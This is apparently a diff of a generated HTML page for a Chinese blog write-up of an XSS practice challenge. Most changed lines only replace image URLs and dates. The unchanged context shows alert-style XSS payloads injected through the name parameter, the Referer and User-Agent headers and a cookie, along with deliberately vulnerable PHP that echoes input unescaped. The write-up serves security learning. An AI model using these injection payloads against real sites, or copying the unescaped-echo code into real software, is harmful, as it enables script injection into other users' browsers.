@@ -27,15 +27,15 @@
 <meta property="og:site_name" content="kawhi&#39;s Blog">
 <meta property="og:description" content="前言练习一下xss。平台地址为：传送门">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200429170941592.png">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200429203051769.png">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200429203527694.png">
-<meta property="og:image" content="http://img.kawhi.xyz/image-20200429204317830.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200429170941592.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200429203051769.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200429203527694.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200429204317830.png">
 <meta property="article:published_time" content="2020-04-28T16:00:00.000Z">
-<meta property="article:modified_time" content="2020-10-25T02:31:01.095Z">
+<meta property="article:modified_time" content="2020-12-06T08:23:09.560Z">
 <meta property="article:author" content="kawhi">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://img.kawhi.xyz/image-20200429170941592.png">
+<meta name="twitter:image" content="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200429170941592.png">
 
 <link rel="canonical" href="https://www.getflag.cn/2020/04/29/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/">
 
@@ -229,7 +229,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-25 10:31:01" itemprop="dateModified" datetime="2020-10-25T10:31:01+08:00">2020-10-25</time>
+                <time title="修改时间：2020-12-06 16:23:09" itemprop="dateModified" datetime="2020-12-06T16:23:09+08:00">2020-12-06</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -270,7 +270,7 @@
 <h5 id="level1"><a href="#level1" class="headerlink" title="level1"></a><strong>level1</strong></h5><p>没有任何过滤，直接给name传值，<strong>payload：</strong></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<img src="http://img.kawhi.xyz/image-20200429170941592.png" alt="image-20200429170941592" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200429170941592.png" alt="image-20200429170941592" style="high:80%;width:80%;" />
 
 <p>源代码：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span>.$str.<span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
@@ -345,7 +345,7 @@
 
 <p>发现<code>keyword</code>和<code>t_sort</code>这两个参数都被<code>htmlspecialchars</code>。</p>
 <p>而<code>t_ref</code>是refer头，过滤了尖括号。截包改refer头即可。</p>
-<img src="http://img.kawhi.xyz/image-20200429203051769.png" alt="image-20200429203051769" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200429203051769.png" alt="image-20200429203051769" style="high:80%;width:80%;" />
 
 <p><strong>payload:</strong></p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">referer:<span class="string">&quot;type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span>alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>
@@ -354,7 +354,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>和11关类似：</p>
-<img src="http://img.kawhi.xyz/image-20200429203527694.png" alt="image-20200429203527694" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200429203527694.png" alt="image-20200429203527694" style="high:80%;width:80%;" />
 
 <p><strong>payload：</strong></p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:<span class="string">&quot;type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span>alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>
@@ -363,7 +363,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">setcookie(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">&quot;user&quot;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>和前两关差不多，传cookie进user变量。</p>
-<img src="http://img.kawhi.xyz/image-20200429204317830.png" alt="image-20200429204317830" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200429204317830.png" alt="image-20200429204317830" style="high:80%;width:80%;" />
 
 <p><strong>payload:</strong></p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="string">&quot; onclick=alert(/xss/) type=&quot;</span>button<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
